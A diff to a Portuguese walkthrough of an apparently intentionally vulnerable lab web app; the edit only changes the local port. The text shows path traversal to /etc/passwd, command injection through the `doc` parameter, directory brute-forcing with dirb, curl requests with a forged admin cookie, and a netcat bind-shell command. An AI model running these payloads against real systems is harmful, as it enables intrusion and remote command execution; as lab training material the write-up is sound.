@@ -61,7 +61,7 @@ a07bda8fd5e39462b4c3d860a36f6b4d
 
 A página Sobre Nós claramente exibe o conteúdo de arquivos texto que estão no servidor. Ao clicar em um deles, a URL fica da seguinte forma:
 
-[http://0.0.0.0:8000/about?doc=termo_de_uso](http://0.0.0.0:8000/about?doc=termo_de_uso)
+[http://0.0.0.0:8080/about?doc=termo_de_uso](http://0.0.0.0:8080/about?doc=termo_de_uso)
 
 Vamos explorar esse parâmetro:
 
@@ -70,9 +70,9 @@ Vamos explorar esse parâmetro:
 
 Provavelmente não vemos nada porque esse campo recebe o nome do arquivo e faz prepend de um caminho e append de uma extensão. Logo, termo_de_uso deve virar algo como /pasta/termo_de_uso.txt. Se isso for verdade, podemos testar com diretórios relativos + null bytes e também com múltiplos nomes de arquivos.
 
-- [http://0.0.0.0:8000/about?doc=../../../../../etc/passwd%00](http://0.0.0.0:8000/about?doc=../../../../../etc/passwd%00)  Quebra por causa do null byte.
-- [http://0.0.0.0:8000/about?doc=/etc/hostname /etc/fstab /etc/passwd /etc/mtab /etc/hosts](http://0.0.0.0:8000/about?doc=/etc/hostname%20/etc/fstab%20/etc/passwd%20/etc/mtab%20/etc/hosts) mostra o conteúdo de todos os arquivos, menos o primeiro e o último.
-- Será que neste contexto ele repassa o path para o shell? Se sim, podemos tentar executar comandos... [http://0.0.0.0:8000/about?doc=../../../../../etc/passwd%20$(echo%20/etc/hosts)%20x](http://0.0.0.0:8000/about?doc=../../../../../etc/passwd%20$(echo%20/etc/hosts)%20x). Game over!
+- [http://0.0.0.0:8080/about?doc=../../../../../etc/passwd%00](http://0.0.0.0:8080/about?doc=../../../../../etc/passwd%00)  Quebra por causa do null byte.
+- [http://0.0.0.0:8080/about?doc=/etc/hostname /etc/fstab /etc/passwd /etc/mtab /etc/hosts](http://0.0.0.0:8080/about?doc=/etc/hostname%20/etc/fstab%20/etc/passwd%20/etc/mtab%20/etc/hosts) mostra o conteúdo de todos os arquivos, menos o primeiro e o último.
+- Será que neste contexto ele repassa o path para o shell? Se sim, podemos tentar executar comandos... [http://0.0.0.0:8080/about?doc=../../../../../etc/passwd%20$(echo%20/etc/hosts)%20x](http://0.0.0.0:8080/about?doc=../../../../../etc/passwd%20$(echo%20/etc/hosts)%20x). Game over!
 
 #### Contato: CSRF + XSS (Firefox)
 
@@ -122,7 +122,7 @@ Ao trocar o cookie e dar refresh, os privilégios da sessão são elevados insta
 
 Como não há nenhum recurso que impeça múltiplos requests sequenciais, ferramentas como o DIRB, o Nikto e o ZAP podem fazer ataques fuzzy ou via listas para encontrar diretórios ocultos.
 
-`dirb http://0.0.0.0:8000/`
+`dirb http://0.0.0.0:8080/`
 
 Achamos um /status oculto.
 
@@ -132,7 +132,7 @@ O diretório /status que só permite a execução de determinados comandos e ape
 
 ```
 curl --cookie 'pyverysafelogin=21232f297a57a5a743894a0e4a801fc3' \
-    'http://0.0.0.0:8000/status' \
+    'http://0.0.0.0:8080/status' \
     -X POST \
     --data 'cmd=env'
 ```
@@ -141,7 +141,7 @@ Para subir um shell reverso, caso o servidor tenha Netcat instalado:
 
 ```
 curl --cookie 'pyverysafelogin=21232f297a57a5a743894a0e4a801fc3' \
-    'http://0.0.0.0:8000/status' \
+    'http://0.0.0.0:8080/status' \
     -X POST \
     --data 'cmd=nc -lvp 8443 -e /bin/bash'
 ```
